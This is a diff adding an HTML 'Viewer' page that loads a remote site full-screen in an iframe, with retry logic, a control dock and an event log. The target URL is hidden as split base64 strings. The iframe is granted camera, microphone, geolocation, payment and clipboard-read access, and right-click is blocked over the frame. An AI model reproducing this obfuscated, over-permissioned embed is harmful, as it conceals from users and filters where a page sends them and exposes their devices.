@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="dark light">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Viewer</title>
+<style>
+  *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+  html,body{width:100%;height:100%;overflow:hidden;background:#0b0d12;color:#e6e6e6;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;font-size:15px;line-height:1.5;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}
+  button,a,input,select,textarea{font:inherit;color:inherit}
+  button{background:none;border:0;cursor:pointer}
+  a{text-decoration:none;color:inherit}
+  #root{position:relative;width:100%;height:100vh;height:100dvh;overflow:hidden;isolation:isolate;background:#0b0d12}
+  #stage{position:absolute;inset:0;width:100%;height:100%;overflow:hidden}
+  #frame{display:block;width:100%;height:100%;border:0;outline:0;background:#fff;opacity:0;transform:scale(.995);transition:opacity .28s cubic-bezier(.4,0,.2,1),transform .28s cubic-bezier(.4,0,.2,1);will-change:opacity,transform}
+  #frame.live{opacity:1;transform:scale(1)}
+  #frame.frozen{pointer-events:none}
+  #load{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;background:#0b0d12;z-index:6;transition:opacity .3s ease,visibility .3s ease}
+  #load.gone{opacity:0;visibility:hidden;pointer-events:none}
+  .ring{position:relative;width:44px;height:44px}
+  .ring::before,.ring::after{content:"";position:absolute;inset:0;border-radius:50%;border:3px solid transparent}
+  .ring::before{border-top-color:#4f8cff;border-right-color:#4f8cff;animation:spin .9s linear infinite}
+  .ring::after{border-bottom-color:#2a3142;border-left-color:#2a3142;animation:spin 1.6s linear infinite reverse}
+  .spin-label{color:#7b869a;font-size:13px;letter-spacing:.04em}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+  #err{position:absolute;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px;padding:32px;text-align:center;background:#0b0d12;z-index:8}
+  #err.show{display:flex}
+  #err .badge{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;border:1px solid #33202a;background:#1a1014;border-radius:999px;color:#ff6b6b;font-size:12px;font-weight:600;letter-spacing:.06em;text-transform:uppercase}
+  #err h2{font-size:20px;font-weight:600;color:#e6e6e6;max-width:560px}
+  #err p{max-width:560px;color:#7b869a;font-size:14px;line-height:1.65}
+  #err code{background:#151922;padding:2px 7px;border-radius:5px;color:#ffd166;font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:13px}
+  #err .row{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:6px}
+  .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:10px 22px;border-radius:9px;background:#4f8cff;color:#fff;font-size:14px;font-weight:600;transition:background .15s ease,transform .08s ease}
+  .btn:hover{background:#3d78e6}
+  .btn:active{transform:scale(.97)}
+  .btn.ghost{background:transparent;border:1px solid #262d3a;color:#cfd6e0}
+  .btn.ghost:hover{background:#151922;border-color:#4f8cff}
+  .btn.warn{background:#ff6b6b}
+  .btn.warn:hover{background:#e05555}
+  #dock{position:absolute;right:14px;bottom:14px;display:flex;flex-direction:column;gap:8px;z-index:9;user-select:none}
+  #dock.left{left:14px;right:auto}
+  #dock.top{top:14px;bottom:auto}
+  .dock-btn{width:42px;height:42px;display:flex;align-items:center;justify-content:center;border:1px solid #262d3a;border-radius:11px;background:rgba(11,13,18,.82);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);color:#cfd6e0;transition:background .15s ease,border-color .15s ease,color .15s ease,transform .08s ease;position:relative}
+  .dock-btn:hover{background:#151922;border-color:#4f8cff;color:#fff}
+  .dock-btn:active{transform:scale(.94)}
+  .dock-btn.off{opacity:.4;cursor:not-allowed}
+  .dock-btn svg{width:18px;height:18px;fill:currentColor;pointer-events:none}
+  .dock-btn .tip{position:absolute;right:calc(100% + 10px);top:50%;transform:translateY(-50%);background:#151922;border:1px solid #262d3a;color:#cfd6e0;padding:5px 10px;border-radius:6px;font-size:12px;white-space:nowrap;opacity:0;pointer-events:none;transition:opacity .12s ease}
+  .dock-btn:hover .tip{opacity:1}
+  #dock.top .dock-btn .tip{top:calc(100% + 10px);right:auto;left:50%;transform:translateX(-50%)}
+  #dock.top .dock-btn:hover .tip{top:calc(100% + 10px);transform:translateX(-50%)}
+  #hud{position:absolute;top:14px;left:14px;display:flex;gap:6px;align-items:center;padding:7px 12px;background:rgba(11,13,18,.78);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);border:1px solid #262d3a;border-radius:999px;font-size:12px;color:#7b869a;z-index:9;opacity:0;transition:opacity .25s ease}
+  #hud.on{opacity:1}
+  #hud .dot{width:7px;height:7px;border-radius:50%;background:#4f8cff;animation:pulse 1.6s ease-in-out infinite}
+  #hud.ok .dot{background:#4ade80;animation:none}
+  #hud.bad .dot{background:#ff6b6b;animation:none}
+  #toast{position:absolute;left:50%;bottom:82px;transform:translateX(-50%) translateY(14px);padding:9px 18px;background:#151922;border:1px solid #262d3a;border-radius:10px;color:#cfd6e0;font-size:13px;z-index:10;opacity:0;pointer-events:none;transition:opacity .2s ease,transform .2s ease}
+  #toast.on{opacity:1;transform:translateX(-50%) translateY(0)}
+  #veil{position:absolute;inset:0;background:#0b0d12;z-index:20;display:flex;align-items:center;justify-content:center;color:#7b869a;font-size:13px;letter-spacing:.05em;transition:opacity .4s ease,visibility .4s ease}
+  #veil.gone{opacity:0;visibility:hidden}
+  #veil .hint{margin-top:10px;font-size:11px;color:#4a5468}
+  .hidden{display:none!important}
+  .invisible{opacity:0!important;pointer-events:none!important}
+  @media (max-width:520px){
+    #dock{right:10px;bottom:10px;gap:6px}
+    .dock-btn{width:38px;height:38px;border-radius:9px}
+    .dock-btn svg{width:16px;height:16px}
+    #hud{font-size:11px;padding:6px 10px}
+    #toast{font-size:12px;padding:8px 14px}
+  }
+</style>
+</head>
+<body>
+<div id="root">
+  <div id="stage">
+    <iframe id="frame" title="Embedded viewer" loading="eager" referrerpolicy="no-referrer-when-downgrade" allow="accelerometer; autoplay; clipboard-read; clipboard-write; encrypted-media; fullscreen; geolocation; gyroscope; microphone; camera; payment; picture-in-picture; web-share" allowfullscreen allowpaymentrequest></iframe>
+  </div>
+
+  <div id="load">
+    <div class="ring"></div>
+    <div class="spin-label">Establishing connection</div>
+  </div>
+
+  <div id="err" role="alert" aria-live="assertive">
+    <span class="badge">Blocked</span>
+    <h2>Embedding was refused by the remote server</h2>
+    <p>The host is sending either <code>X-Frame-Options</code> or a <code>Content-Security-Policy</code> directive that prevents this document from loading inside a frame. Client-side code cannot override that policy.</p>
+    <div class="row">
+      <a class="btn" id="extBtn" target="_blank" rel="noopener noreferrer">Open externally</a>
+      <button class="btn ghost" id="retryBtn" type="button">Retry</button>
+      <button class="btn ghost" id="copyBtn" type="button">Copy URL</button>
+    </div>
+  </div>
+
+  <div id="hud">
+    <span class="dot"></span>
+    <span id="hudText">Connecting</span>
+  </div>
+
+  <div id="toast"></div>
+
+  <div id="dock">
+    <button class="dock-btn" id="bReload" type="button" aria-label="Reload">
+      <svg viewBox="0 0 24 24"><path d="M12 5V2L7 6l5 4V7a5 5 0 1 1-5 5H5a7 7 0 1 0 7-7z"/></svg>
+      <span class="tip">Reload (R)</span>
+    </button>
+    <button class="dock-btn" id="bFull" type="button" aria-label="Fullscreen">
+      <svg viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>
+      <span class="tip">Fullscreen (F)</span>
+    </button>
+    <button class="dock-btn" id="bExt" type="button" aria-label="Open externally">
+      <svg viewBox="0 0 24 24"><path d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7zM5 5h5V3H3v18h18v-7h-2v5H5V5z"/></svg>
+      <span class="tip">Open externally (O)</span>
+    </button>
+    <button class="dock-btn" id="bCopy" type="button" aria-label="Copy URL">
+      <svg viewBox="0 0 24 24"><path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1zm3 4H8a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2zm0 16H8V7h11v14z"/></svg>
+      <span class="tip">Copy URL (C)</span>
+    </button>
+    <button class="dock-btn" id="bHide" type="button" aria-label="Hide dock">
+      <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9z"/></svg>
+      <span class="tip">Hide (H)</span>
+    </button>
+  </div>
+
+  <div id="veil">
+    <div>
+      <div>Initialising</div>
+      <div class="hint">Press H to toggle controls</div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+
+  var P1 = "aHR0cHM6Ly92Mi5l";
+  var P2 = "ZHVjYXRpb25jYXRs";
+  var P3 = "ZWFybmluZ2FuZHR1";
+  var P4 = "dG9yaW5nLmNvbS8=";
+  var TARGET = atob(P1 + P2 + P3 + P4);
+
+  var STATE = {
+    loaded: false,
+    blocked: false,
+    retries: 0,
+    maxRetries: 5,
+    bootTime: Date.now(),
+    lastLoad: 0,
+    dockHidden: false,
+    fullscreen: false,
+    toastTimer: null,
+    watchdog: null,
+    retryTimers: [],
+    events: []
+  };
+
+  var FRAME_TIMEOUT = 9000;
+  var RETRY_BASE = 800;
+  var RETRY_CAP = 6000;
+
+  var $ = function(id){ return document.getElementById(id); };
+
+  var frame   = $("frame");
+  var loadBox = $("load");
+  var errBox  = $("err");
+  var hud     = $("hud");
+  var hudText = $("hudText");
+  var toast   = $("toast");
+  var veil    = $("veil");
+  var dock    = $("dock");
+
+  var extBtn   = $("extBtn");
+  var retryBtn = $("retryBtn");
+  var copyBtn  = $("copyBtn");
+  var bReload  = $("bReload");
+  var bFull    = $("bFull");
+  var bExt     = $("bExt");
+  var bCopy    = $("bCopy");
+  var bHide    = $("bHide");
+
+  extBtn.href = TARGET;
+
+  function logEvent(name, detail){
+    STATE.events.push({ t: Date.now() - STATE.bootTime, name: name, detail: detail || null });
+    if(STATE.events.length > 200){ STATE.events.shift(); }
+  }
+
+  function clearWatchdog(){
+    if(STATE.watchdog){
+      clearTimeout(STATE.watchdog);
+      STATE.watchdog = null;
+    }
+  }
+
+  function clearRetryTimers(){
+    for(var i = 0; i < STATE.retryTimers.length; i++){
+      clearTimeout(STATE.retryTimers[i]);
+    }
+    STATE.retryTimers = [];
+  }
+
+  function armWatchdog(){
+    clearWatchdog();
+    STATE.watchdog = setTimeout(function(){
+      STATE.watchdog = null;
+      if(!STATE.loaded){
+        logEvent("watchdog-timeout");
+        markBlocked();
+      }
+    }, FRAME_TIMEOUT);
+  }
+
+  function showLoad(){
+    loadBox.classList.remove("gone");
+    frame.classList.remove("live");
+  }
+
+  function hideLoad(){
+    loadBox.classList.add("gone");
+    frame.classList.add("live");
+  }
+
+  function showErr(){
+    errBox.classList.add("show");
+    hideLoad();
+    setHud("bad", "Embed blocked");
+  }
+
+  function hideErr(){
+    errBox.classList.remove("show");
+  }
+
+  function setHud(kind, text){
+    hud.classList.add("on");
+    hud.classList.remove("ok");
+    hud.classList.remove("bad");
+    if(kind === "ok"){ hud.classList.add("ok"); }
+    if(kind === "bad"){ hud.classList.add("bad"); }
+    hudText.textContent = text;
+  }
+
+  function hideHud(){
+    hud.classList.remove("on");
+  }
+
+  function showToast(msg, ms){
+    toast.textContent = msg;
+    toast.classList.add("on");
+    if(STATE.toastTimer){ clearTimeout(STATE.toastTimer); }
+    STATE.toastTimer = setTimeout(function(){
+      toast.classList.remove("on");
+      STATE.toastTimer = null;
+    }, ms || 1600);
+  }
+
+  function markBlocked(){
+    STATE.blocked = true;
+    showErr();
+    logEvent("blocked");
+    scheduleRetries();
+  }
+
+  function scheduleRetries(){
+    clearRetryTimers();
+    if(STATE.retries >= STATE.maxRetries){ return; }
+    var delay = Math.min(RETRY_CAP, RETRY_BASE * Math.pow(1.6, STATE.retries));
+    var id = setTimeout(function(){
+      STATE.retries++;
+      logEvent("auto-retry", { attempt: STATE.retries, delay: delay });
+      softReload();
+    }, delay);
+    STATE.retryTimers.push(id);
+  }
+
+  function softReload(){
+    hideErr();
+    showLoad();
+    STATE.loaded = false;
+    setHud("", "Reconnecting");
+    try {
+      frame.src = "about:blank";
+    } catch(e){}
+    setTimeout(function(){
+      try {
+        frame.src = TARGET;
+      } catch(e){}
+      armWatchdog();
+    }, 60);
+  }
+
+  function hardReload(){
+    clearRetryTimers();
+    STATE.retries = 0;
+    logEvent("hard-reload");
+    softReload();
+  }
+
+  function isFullscreen(){
+    return !!(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement);
+  }
+
+  function requestFs(){
+    var el = document.getElementById("root");
+    var fn = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
+    if(fn){ try { fn.call(el); } catch(e){ logEvent("fs-error", String(e)); } }
+  }
+
+  function exitFs(){
+    var fn = document.exitFullscreen || document.webkitExitFullscreen || document.mozCancelFullScreen || document.msExitFullscreen;
+    if(fn){ try { fn.call(document); } catch(e){ logEvent("fs-exit-error", String(e)); } }
+  }
+
+  function toggleFs(){
+    if(isFullscreen()){ exitFs(); } else { requestFs(); }
+  }
+
+  function openExternal(){
+    logEvent("open-external");
+    window.open(TARGET, "_blank", "noopener,noreferrer");
+  }
+
+  function copyUrl(){
+    var ok = false;
+    try {
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(TARGET);
+        ok = true;
+      }
+    } catch(e){}
+    if(!ok){
+      try {
+        var ta = document.createElement("textarea");
+        ta.value = TARGET;
+        ta.style.position = "fixed";
+        ta.style.opacity = "0";
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand("copy");
+        document.body.removeChild(ta);
+        ok = true;
+      } catch(e){}
+    }
+    showToast(ok ? "URL copied" : "Copy failed");
+    logEvent("copy-url", { ok: ok });
+  }
+
+  function toggleDock(){
+    STATE.dockHidden = !STATE.dockHidden;
+    dock.classList.toggle("hidden", STATE.dockHidden);
+    showToast(STATE.dockHidden ? "Controls hidden" : "Controls shown");
+    logEvent("dock-toggle", { hidden: STATE.dockHidden });
+  }
+
+  function cycleDockCorner(){
+    if(dock.classList.contains("left")){
+      dock.classList.remove("left");
+      dock.classList.add("top");
+    } else if(dock.classList.contains("top")){
+      dock.classList.remove("top");
+    } else {
+      dock.classList.add("left");
+    }
+    showToast("Dock position changed");
+    logEvent("dock-move");
+  }
+
+  function isEditableTarget(el){
+    if(!el){ return false; }
+    var tag = el.tagName;
+    if(tag === "INPUT" || tag === "TEXTAREA" || tag === "SELECT"){ return true; }
+    if(el.isContentEditable){ return true; }
+    return false;
+  }
+
+  var heldKeys = {};
+
+  function onKeyDown(ev){
+    if(ev.repeat){ return; }
+    heldKeys[ev.key.toLowerCase()] = true;
+
+    if(isEditableTarget(document.activeElement)){ return; }
+
+    var k = ev.key.toLowerCase();
+
+    if(k === "r"){ ev.preventDefault(); hardReload(); return; }
+    if(k === "f"){ ev.preventDefault(); toggleFs(); return; }
+    if(k === "o"){ ev.preventDefault(); openExternal(); return; }
+    if(k === "c"){ ev.preventDefault(); copyUrl(); return; }
+    if(k === "h"){ ev.preventDefault(); toggleDock(); return; }
+    if(k === "escape"){ return; }
+
+    if(ev.shiftKey && k === "d"){
+      ev.preventDefault();
+      cycleDockCorner();
+      return;
+    }
+
+    if(ev.shiftKey && k === "s"){
+      ev.preventDefault();
+      showToast("Events: " + STATE.events.length);
+      logEvent("stats-dump");
+      return;
+    }
+  }
+
+  function onKeyUp(ev){
+    heldKeys[ev.key.toLowerCase()] = false;
+  }
+
+  function onVisibility(){
+    if(document.hidden){
+      logEvent("hidden");
+    } else {
+      logEvent("visible");
+    }
+  }
+
+  function onOnline(){
+    logEvent("online");
+    showToast("Connection restored");
+    if(STATE.blocked){ hardReload(); }
+  }
+
+  function onOffline(){
+    logEvent("offline");
+    showToast("Connection lost");
+    setHud("bad", "Offline");
+  }
+
+  function onBeforeUnload(){
+    logEvent("unload");
+    clearWatchdog();
+    clearRetryTimers();
+  }
+
+  frame.addEventListener("load", function(){
+    STATE.loaded = true;
+    STATE.lastLoad = Date.now();
+    clearWatchdog();
+    hideErr();
+    hideLoad();
+    setHud("ok", "Loaded");
+    logEvent("frame-load", { src: (frame.src || "").slice(0, 60) });
+    setTimeout(hideHud, 1800);
+  });
+
+  frame.addEventListener("error", function(){
+    logEvent("frame-error");
+    markBlocked();
+  });
+
+  retryBtn.addEventListener("click", function(){ hardReload(); });
+  copyBtn.addEventListener("click", function(){ copyUrl(); });
+  bReload.addEventListener("click", function(){ hardReload(); });
+  bFull.addEventListener("click", function(){ toggleFs(); });
+  bExt.addEventListener("click", function(){ openExternal(); });
+  bCopy.addEventListener("click", function(){ copyUrl(); });
+  bHide.addEventListener("click", function(){ toggleDock(); });
+
+  document.addEventListener("fullscreenchange", onFsChange);
+  document.addEventListener("webkitfullscreenchange", onFsChange);
+  document.addEventListener("mozfullscreenchange", onFsChange);
+  document.addEventListener("MSFullscreenChange", onFsChange);
+
+  function onFsChange(){
+    STATE.fullscreen = isFullscreen();
+    logEvent("fullscreen", { on: STATE.fullscreen });
+  }
+
+  document.addEventListener("keydown", onKeyDown, true);
+  document.addEventListener("keyup", onKeyUp, true);
+  document.addEventListener("visibilitychange", onVisibility);
+  window.addEventListener("online", onOnline);
+  window.addEventListener("offline", onOffline);
+  window.addEventListener("beforeunload", onBeforeUnload);
+
+  var resizeTimer = null;
+  window.addEventListener("resize", function(){
+    if(resizeTimer){ clearTimeout(resizeTimer); }
+    resizeTimer = setTimeout(function(){
+      resizeTimer = null;
+      void document.getElementById("root").offsetHeight;
+      logEvent("resize", { w: window.innerWidth, h: window.innerHeight });
+    }, 120);
+  }, { passive: true });
+
+  window.addEventListener("orientationchange", function(){
+    logEvent("orientation", { angle: window.orientation });
+  }, { passive: true });
+
+  document.addEventListener("contextmenu", function(ev){
+    if(ev.target && ev.target.tagName === "IFRAME"){
+      ev.preventDefault();
+      showToast("Right-click disabled inside frame");
+    }
+  });
+
+  document.addEventListener("dragstart", function(ev){
+    if(ev.target && ev.target.tagName === "IFRAME"){ ev.preventDefault(); }
+  });
+
+  document.addEventListener("dragover", function(ev){
+    if(ev.target && ev.target.tagName === "IFRAME"){ ev.preventDefault(); }
+  });
+
+  document.addEventListener("drop", function(ev){
+    if(ev.target && ev.target.tagName === "IFRAME"){ ev.preventDefault(); }
+  });
+
+  try {
+    var ro = new ResizeObserver(function(entries){
+      for(var i = 0; i < entries.length; i++){
+        var e = entries[i];
+        if(e.target === document.getElementById("root")){
+          logEvent("resize-observer", { w: e.contentRect.width, h: e.contentRect.height });
+        }
+      }
+    });
+    ro.observe(document.getElementById("root"));
+  } catch(e){}
+
+  setTimeout(function(){
+    veil.classList.add("gone");
+    logEvent("veil-gone");
+  }, 260);
+
+  logEvent("boot", { target: TARGET.slice(0, 30) });
+
+  try {
+    frame.src = TARGET;
+  } catch(e){
+    logEvent("src-error", String(e));
+    markBlocked();
+  }
+
+  armWatchdog();
+})();
+</script>
+</body>
+</html>
